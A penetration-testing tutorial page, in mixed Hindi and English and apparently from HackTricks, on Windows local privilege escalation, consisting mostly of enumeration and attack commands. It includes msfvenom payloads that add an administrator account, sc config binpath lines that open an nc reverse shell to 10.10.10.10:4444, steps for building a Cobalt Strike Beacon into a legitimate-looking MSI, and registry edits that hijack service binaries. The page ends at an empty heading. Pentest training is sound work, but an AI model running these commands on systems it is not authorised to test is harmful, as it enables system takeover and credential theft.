# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो आगे बढ़ने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्नलिखित पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में Integrity Levels क्या हैं, तो आगे बढ़ने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows सुरक्षा नियंत्रण

Windows में कई अलग-अलग चीज़ें हैं जो कि आपको **prevent you from enumerating the system**, executable चलाने से रोक सकती हैं या यहाँ तक कि आपकी गतिविधियों को **detect your activities** भी कर सकती हैं। आपको निम्नलिखित **page** को **read** करना चाहिए और इन सभी **defenses** **mechanisms** को **enumerate** करना चाहिए इससे पहले कि आप privilege escalation enumeration शुरू करें:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## सिस्टम जानकारी

### Version info enumeration

जाँचें कि Windows version में कोई ज्ञात vulnerability है या नहीं (लगाए गए patches भी जाँचें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft security vulnerabilities के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। यह डेटाबेस 4,700 से अधिक security vulnerabilities को सूचीबद्ध करता है, जो एक Windows environment द्वारा प्रस्तुत किए गए **massive attack surface** को दर्शाता है।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson शामिल है)_

**लोकल रूप से system information के साथ**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या कोई credential/Juicy info env variables में सेव है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript फ़ाइलें

इसे चालू करने का तरीका आप [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) पर सीख सकते हैं
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन निष्पादन का विवरण रिकॉर्ड किया जाता है, जिसमें निष्पादित कमांड, कमांड आह्वान और स्क्रिप्ट के हिस्से शामिल होते हैं। हालांकि, पूर्ण निष्पादन विवरण और आउटपुट परिणाम पूरी तरह कैप्चर नहीं हो सकते।

इसे सक्षम करने के लिए, documentation के "Transcript files" सेक्शन में दिए गए निर्देशों का पालन करें, और **"Module Logging"** को **"Powershell Transcription"** के बजाय चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से आखिरी 15 events देखने के लिए आप निम्नलिखित कमांड चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की पूरी गतिविधि और संपूर्ण सामग्री का रिकॉर्ड कैप्चर किया जाता है, जिससे यह सुनिश्चित होता है कि कोड का प्रत्येक ब्लॉक चलते समय दस्तावेजीकृत होता है। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक ऑडिट ट्रेल संरक्षित करती है, जो forensics और malicious behavior के विश्लेषण के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों का दस्तावेजीकरण करके प्रक्रिया के बारे में विस्तृत अंतर्दृष्टि प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लॉगिंग इवेंट्स Windows Event Viewer में निम्न पाथ पर पाए जा सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
आखिरी 20 इवेंट्स देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट्स http**S** की बजाय http के माध्यम से अनुरोधित किए जा रहे हों तो आप सिस्टम को compromise कर सकते हैं।

आप cmd में निम्नलिखित चलाकर यह जांच करते हैं कि नेटवर्क non-SSL WSUS update का उपयोग कर रहा है या नहीं:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से कोई प्रतिक्रिया मिलती है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास meterpreter session है, तो आप इस तकनीक को मॉड्यूल **`exploit/windows/local/always_install_elevated`** का उपयोग करके स्वचालित कर सकते हैं।

### PowerUP

Power-up से `Write-UserAddMSI` कमांड का उपयोग करें ताकि वर्तमान निर्देशिका के अंदर एक Windows MSI बाइनरी बनाई जा सके to escalate privileges. यह स्क्रिप्ट एक precompiled MSI installer लिखती है जो user/group addition के लिए prompt करता है (so you will need GIU access):
```
Write-UserAddMSI
```
बस बनाए गए binary को execute करें ताकि आप escalate privileges कर सकें।

### MSI Wrapper

इस ट्यूटोरियल को पढ़ें ताकि आप सीख सकें कैसे MSI wrapper बनाया जाता है इन tools का उपयोग करके। ध्यान दें कि आप एक "**.bat**" फ़ाइल को wrap कर सकते हैं अगर आप **सिर्फ** **execute** **command lines** करना चाहते हैं


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike या Metasploit का उपयोग करके `C:\privesc\beacon.exe` में एक **new Windows EXE TCP payload** Generate करें
- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट का नाम दें, जैसे **AlwaysPrivesc**, location के लिए **`C:\privesc`** का उपयोग करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते रहें जब तक आप step 3 of 4 (choose files to include) पर नहीं पहुँच जाते। **Add** पर क्लिक करें और अभी जो Beacon payload आपने जनरेट किया है उसे चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाइलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer** जो इंस्टॉल्ड ऐप को अधिक वैध दिखा सकते हैं।
- प्रोजेक्ट पर राइट-क्लिक करें और **View > Custom Actions** चुनें।
- **Install** पर राइट-क्लिक करें और **Add Custom Action** चुनें।
- **Application Folder** पर डबल-क्लिक करें, अपनी **beacon.exe** फ़ाइल चुनें और **OK** पर क्लिक करें। इससे सुनिश्चित होगा कि installer चलाते ही beacon payload execute हो जाएगा।
- **Custom Action Properties** के अंतर्गत **Run64Bit** को **True** में बदलें।
- अंत में, **build it**।
- यदि चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

हानिकारक `.msi` फ़ाइल की **installation** को **background** में execute करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस कमज़ोरी का शोषण करने के लिए आप उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## एंटीवायरस और डिटेक्टर

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको इस पर ध्यान देना चाहिए
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** का उद्देश्य **management of local Administrator passwords** के लिए है — यह सुनिश्चित करता है कि डोमेन से जुड़े कंप्यूटरों पर प्रत्येक पासवर्ड **unique, randomised, and regularly updated** हो। ये पासवर्ड Active Directory में सुरक्षित रूप से संग्रहित होते हैं और केवल उन्हीं उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त permissions दिए गए हों, जो उन्हें अधिकृत होने पर local admin passwords देखने की अनुमति देता है।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय हो तो, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से, Microsoft ने Local Security Authority (LSA) के लिए उन्नत सुरक्षा पेश की ताकि अविश्वसनीय प्रक्रियाओं द्वारा इसकी **मेमोरी पढ़ने** या कोड इंजेक्ट करने के प्रयासों को **रोककर** सिस्टम को और सुरक्षित बनाया जा सके.\  
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash attacks जैसे खतरों से सुरक्षित रखना है।| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणीकृत किया जाता है और ऑपरेटिंग सिस्टम के घटकों द्वारा उपयोग किया जाता है। जब किसी उपयोगकर्ता के logon डेटा को किसी registered security package द्वारा प्रमाणीकृत किया जाता है, तो आम तौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित कर दिए जाते हैं।\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ताओं और समूहों को सूचीबद्ध करें

आपको यह जांचना चाहिए कि आप जिन समूहों के सदस्य हैं, उनमें से किसी के पास कोई रोचक permissions तो नहीं हैं
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकार समूह

**यदि आप किसी विशेषाधिकार समूह के सदस्य हैं तो आप विशेषाधिकार वृद्धि (privilege escalation) कर सकते हैं।** विशेषाधिकार समूहों और उन्हें दुरुपयोग करके विशेषाधिकार बढ़ाने के बारे में यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### टोकन मैनिपुलेशन

**और जानें** कि **token** क्या है इस पृष्ठ पर: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पृष्ठ देखें ताकि आप **रोचक टोकन** और उन्हें दुरुपयोग करने का तरीका सीख सकें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग किए गए उपयोगकर्ता / सत्र
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Password नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## Running Processes

### File and Folder Permissions

सबसे पहले, प्रक्रियाओं की सूची बनाते समय **प्रक्रिया के command line के अंदर passwords की जाँच करें**.\\
जाँच करें कि क्या आप **किसी चल रही binary को overwrite कर सकते हैं** या binary फ़ोल्डर पर आपके पास write permissions हैं ताकि आप संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का exploit कर सकें:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा जाँच करें कि क्या संभावित [**electron/cef/chromium debuggers** चल रहे हैं — आप उनका दुरुपयोग कर अधिकार बढ़ा सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**प्रोसेस बाइनरीज़ की अनुमतियों की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फ़ोल्डरों की अनुमतियों की जांच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### मेमोरी पासवर्ड माइनिंग

आप चल रहे किसी प्रोसेस का मेमोरी डम्प **procdump** from sysinternals का उपयोग करके बना सकते हैं। FTP जैसी सेवाओं की मेमोरी में **credentials in clear text in memory** होते हैं; मेमोरी डम्प करके उन credentials को पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले एप्लिकेशन उपयोगकर्ता को CMD लॉन्च करने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकते हैं।**

Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## सेवाएँ

सेवाओं की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी सेवा की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं।
```bash
sc qc <service_name>
```
प्रत्येक service के लिए आवश्यक privilege level की जाँच करने के लिए _Sysinternals_ के binary **accesschk** का होना अनुशंसित है।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
सुझाव दिया जाता है कि जांचें कि "Authenticated Users" किसी भी सेवा को संशोधित कर सकते हैं या नहीं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[आप यहाँ accesschk.exe (XP के लिए) डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि हो रही है (उदाहरण के लिए SSDPSRV के साथ):

_सिस्टम त्रुटि 1058 हुई है._\
_सेवा शुरू नहीं की जा सकती, या तो क्योंकि यह अक्षम है या क्योंकि इसके साथ कोई सक्रिय डिवाइस संबद्ध नहीं है._

आप इसे सक्षम करने के लिए निम्न का उपयोग कर सकते हैं
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान में रखें कि सेवा upnphost काम करने के लिए SSDPSRV पर निर्भर करती है (XP SP1 के लिए)**

इस समस्या का **एक और समाधान** यह है कि निम्न चलाया जाए:
```
sc.exe config usosvc start= auto
```
### **सेवा के बाइनरी पथ को संशोधित करें**

यदि किसी सेवा पर "Authenticated users" समूह के पास **SERVICE_ALL_ACCESS** है, तो सेवा के executable बाइनरी को संशोधित करना संभव है। इसे संशोधित करने और **sc** चलाने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनः आरंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
अधिकार विभिन्न अनुमतियों के माध्यम से बढ़ाये जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: सर्विस बाइनरी को पुनः कॉन्फ़िगर करने की अनुमति देता है।
- **WRITE_DAC**: अनुमतियों को पुनः कॉन्फ़िगर करने में सक्षम बनाता है, जिससे सर्विस कॉन्फ़िगरेशन बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: स्वामित्व प्राप्त करने और अनुमतियाँ पुनः कॉन्फ़िगर करने की अनुमति देता है।
- **GENERIC_WRITE**: सर्विस कॉन्फ़िगरेशन बदलने की क्षमता देता है।
- **GENERIC_ALL**: यह भी सर्विस कॉन्फ़िगरेशन बदलने की क्षमता देता है।

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### सर्विस बाइनरीज़ की कमजोर अनुमतियाँ

**जाँचें कि क्या आप उस बाइनरी को modify कर सकते हैं जिसे कोई service execute करता है** या क्या आपके पास **write permissions on the folder** हैं जहाँ बाइनरी स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप किसी सर्विस द्वारा execute की जाने वाली प्रत्येक बाइनरी को **wmic** (not in system32) का उपयोग करके प्राप्त कर सकते हैं और अपनी permissions की जाँच **icacls** का उपयोग करके कर सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का उपयोग भी कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### सर्विस रजिस्ट्री संशोधन अनुमतियाँ

आपको जांचना चाहिए कि क्या आप किसी भी सर्विस रजिस्ट्री को संशोधित कर सकते हैं.\
आप निम्नलिखित करके किसी सर्विस **रजिस्ट्री** पर अपनी **अनुमतियाँ** **जाँच** सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
जांचना चाहिए कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` अनुमतियाँ हैं। यदि ऐसा है, तो सेवा द्वारा चलाए जाने वाले बाइनरी को बदला जा सकता है।

चलाए जाने वाले binary का Path बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है तो इसका मतलब है कि **आप इस registry से सब-रजिस्ट्रीज़ बना सकते हैं**। Windows services के मामले में यह **arbitrary code निष्पादित करने के लिए पर्याप्त है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes के अंदर नहीं है, तो Windows स्पेस से पहले आने वाले हर हिस्से को execute करने की कोशिश करेगा।

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
उद्धरण-रहित सेवा पथों को सूचीबद्ध करें, जो built-in Windows सेवाओं से संबंधित न हों:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस vulnerability का पता लगा सकते हैं और इसका शोषण कर सकते हैं** metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप मैन्युअली metasploit के साथ एक सर्विस बाइनरी बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई सेवा विफल हो तो क्या कार्रवाई की जानी चाहिए। यह फीचर किसी binary की ओर इंगित करने के लिए कॉन्फ़िगर किया जा सकता है। यदि यह binary बदलने योग्य है, तो privilege escalation संभव हो सकता है। अधिक जानकारी के लिए देखें [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## एप्लिकेशन

### इंस्टॉल किए गए एप्लिकेशन

जाँचें **permissions of the binaries** (शायद आप किसी एक को overwrite करके escalate privileges कर सकें) और **folders** की भी ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लिखने की अनुमतियाँ

